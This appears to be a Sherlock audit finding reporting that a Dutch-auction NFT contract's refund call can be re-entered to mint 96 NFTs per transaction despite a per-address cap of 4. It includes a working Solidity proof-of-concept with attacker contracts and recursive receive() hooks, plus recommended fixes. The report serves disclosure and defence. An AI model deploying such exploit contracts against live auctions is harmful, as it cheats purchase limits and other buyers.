# [H] User can mint up to 96 NFTs in a single transaction

## Summary
Severity: High
Reporter: dirk_y
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L161-L165
Type: audit-issue

## Details
# User can mint up to 96 NFTs in a single transaction

## Summary
A malicious user can mint up to 96 NFTs in a single transaction (far surpassing the current cap per address) by manipulating the refund mechanism.

## Vulnerability Detail
At the moment the auction has a cap on the number of NFTs that can be minted to a single address; `CAP_PER_ADDRESS = 4`. The purpose of this cap is to prevent a single user from purchasing a significant portion of the supply in a single transaction. It's important to note that it is impossible to limit NFTs owned by a single "real person" since that "person" could have multiple addresses that can each purchase up to the cap per address. The benefit of capping per address is that you make it significantly harder for a "person" to acquire a large percentage of the supply since they need to submit a unique transaction with each EOA they own.

However, because of the refund mechanism design, it is now possible for a single "person" to acquire up to 96 NFTs in a single transaction (at the Ethereum block gas limit), which is **24x** higher than the desired cap.

This is possible because when a user sends more ether during calls to `mint` than the current price of the number of NFTs they are trying to purchase from the auction, the remaining ether is refunded to the caller:

```solidity
        if(msg.value > totalPaid) {
            // If too much ETH was sent, refund the difference
            (bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
            require(success, "Refund failed");
        }
```

Since there is no check as to whether or not the caller is a contract, a malicious user can call `mint` from a contract, that can then include a fallback function that calls another contract to then kick-off another minting process. To demonstrate this attack vector I have added an additional test to the suite that can be executed with `forge test -vvv --match-path test/MeritDutchAuction.t.sol`:

```diff
diff --git a/dutch-nft/test/MeritDutchAuction.t.sol b/dutch-nft/test/MeritDutchAuction.t.sol
index 0b40fdc..fb52dc0 100644
--- a/dutch-nft/test/MeritDutchAuction.t.sol
+++ b/dutch-nft/test/MeritDutchAuction.t.sol
@@ -5,6 +5,59 @@ import "forge-std/Test.sol";
 import "../src/MeritNFT.sol";
 import "../src/MeritDutchAuction.sol";
 
+contract MaliciousMinterInstance {    
+    MaliciousMinterCore public core;
+    MeritDutchAuction public auction;
+    
+    constructor(address _auction, address _core) payable {
+        auction = MeritDutchAuction(_auction);
+        core = MaliciousMinterCore(payable(_core)); 
+    }
+
+    // Mint 4 NFTs to this address
+    function mint() public payable {
+        auction.mint{value: msg.value}(4);
+    }
+
+    // Receive the 1 wei refund and perform another mint
+    receive() external payable {
+        core.startMint();
+    }
+}
+
+contract MaliciousMinterCore {
+    uint256 public count;
+    address public auction;
+    MaliciousMinterInstance[] public instances;
+    uint256 public price;
+
+    constructor(address _auction) {
+        auction = _auction;
+
+        // Spawn a set of unique instances
+        for (uint256 i = 0; i < 24; i++) {
+            instances.push(new MaliciousMinterInstance(auction, address(this)));
+        }
+    }
+
+    receive() external payable {}
+    
+    // Fetch the auction price and start the minting process
+    function initialStartMint() external {
+        price = MeritDutchAuction(auction).getPrice();
+        startMint();
+    }
+
+    // Mint 4 NFTs per instance
+    function startMint() public {
+        while (count < 24) {
+            count += 1;
+            // Add 1 to force a refund call
+            instances[count - 1].mint{value: price * 4 + 1}();
+        }
+    }
+}
+
 contract MeritDutchAuctionTest is Test {
     string constant NAME = "Merit NFT";
     string constant SYMBOL = "MERIT";
@@ -52,6 +105,19 @@ contract MeritDutchAuctionTest is Test {
         vm.stopPrank();
     }
 
+    function testBuyAll() public {
+        vm.warp(startTime);
+        // Deploy the malicious contracts and deal ether to buy the NFTs
+        MaliciousMinterCore malicious = new MaliciousMinterCore(address(auction));
+        vm.deal(address(malicious), 1000000e18);
+
+        // Start the recursive minting. We use the block gas limit here
+        malicious.initialStartMint{gas: 30000000}();
+
+        // A single user can mint 96 NFTs in 1 transaction
+        assertEq(auction.minted(), 96);
+    }
+
     function testConstructor() public {
         assertEq(auction.startPrice(), START_PRICE);
         assertEq(auction.endPrice(), END_PRICE);

```

## Impact
A malicious user can effectively circumvent the limit of NFTs that can be purchased from the auction per transaction, exceeding the defined limit of 4 by **24x**.

## Code Snippet
https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L161-L165

## Tool used
Manual Review

## Recommendation
There are a couple of options to avoid this attack vector:

1. Only refund excess ETH when the sender isn't a smart contract
2. Perform the refund call with a predetermined amount of gas rather than all the remaining gas
3. Don't refund the excess ETH

Each of the above options has associated pros and cons, but my personal preference would be to go with option 1 since I expect most minters will be EOAs.
